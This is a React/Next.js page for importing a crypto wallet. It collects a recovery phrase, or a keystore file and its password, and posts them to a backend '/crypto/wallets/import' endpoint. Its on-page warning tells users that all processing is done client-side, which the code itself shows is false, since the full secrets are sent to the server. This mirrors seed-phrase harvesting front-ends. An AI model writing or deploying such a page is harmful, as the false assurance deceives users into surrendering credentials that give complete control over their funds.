"use client"
import { useState } from "react"
import { useRouter } from "next/navigation"
import api from "@/lib/api"
import { Key, FileJson } from "lucide-react"

export default function CryptoImportPage() {
  const router = useRouter()
  const [method, setMethod] = useState<"mnemonic" | "keystore">("mnemonic")
  const [mnemonic, setMnemonic] = useState("")
  const [keystoreJson, setKeystoreJson] = useState("")
  const [keystorePassword, setKeystorePassword] = useState("")
  const [coinSymbol, setCoinSymbol] = useState("ETH")
  const [isLoading, setIsLoading] = useState(false)

  const handleImport = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    try {
      const payload = method === "mnemonic"
        ? { method: "mnemonic", mnemonic, coin_symbol: coinSymbol }
        : { method: "keystore", keystore_json: keystoreJson, keystore_password: keystorePassword, coin_symbol: coinSymbol }
      await api.post("/crypto/wallets/import", payload)
      router.push("/dashboard")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="max-w-lg mx-auto space-y-6">
      <h1 className="text-2xl font-bold">Import Wallet</h1>
      <div className="grid grid-cols-2 gap-2">
        <button onClick={() => setMethod("mnemonic")}
          className={`p-3 rounded-lg border flex items-center justify-center gap-2 ${method === "mnemonic" ? "border-primary bg-primary/10" : "border-input"}`}>
          <Key className="w-4 h-4" /> Mnemonic
        </button>
        <button onClick={() => setMethod("keystore")}
          className={`p-3 rounded-lg border flex items-center justify-center gap-2 ${method === "keystore" ? "border-primary bg-primary/10" : "border-input"}`}>
          <FileJson className="w-4 h-4" /> Keystore
        </button>
      </div>
      <form onSubmit={handleImport} className="space-y-4">
        <select value={coinSymbol} onChange={(e) => setCoinSymbol(e.target.value)}
          className="w-full px-4 py-2 rounded-lg border border-input bg-background">
          {["ETH", "BNB", "MATIC"].map((c) => <option key={c} value={c}>{c}</option>)}
        </select>
        {method === "mnemonic" ? (
          <textarea value={mnemonic} onChange={(e) => setMnemonic(e.target.value)}
            placeholder="Enter your 12 or 24 word recovery phrase" rows={4}
            className="w-full px-4 py-2 rounded-lg border border-input bg-background outline-none" />
        ) : (
          <>
            <textarea value={keystoreJson} onChange={(e) => setKeystoreJson(e.target.value)}
              placeholder="Paste keystore JSON" rows={6}
              className="w-full px-4 py-2 rounded-lg border border-input bg-background outline-none font-mono text-xs" />
            <input type="password" value={keystorePassword} onChange={(e) => setKeystorePassword(e.target.value)}
              placeholder="Keystore password" className="w-full px-4 py-2 rounded-lg border border-input bg-background outline-none" />
          </>
        )}
        <div className="p-3 rounded-lg bg-destructive/10 text-destructive text-xs">
          Warning: Never share your mnemonic or keystore with anyone. All processing is done client-side.
        </div>
        <button type="submit" disabled={isLoading}
          className="w-full py-3 rounded-lg bg-primary text-primary-foreground font-medium disabled:opacity-50">
          {isLoading ? "Importing..." : "Import Wallet"}
        </button>
      </form>
    </div>
  )
}
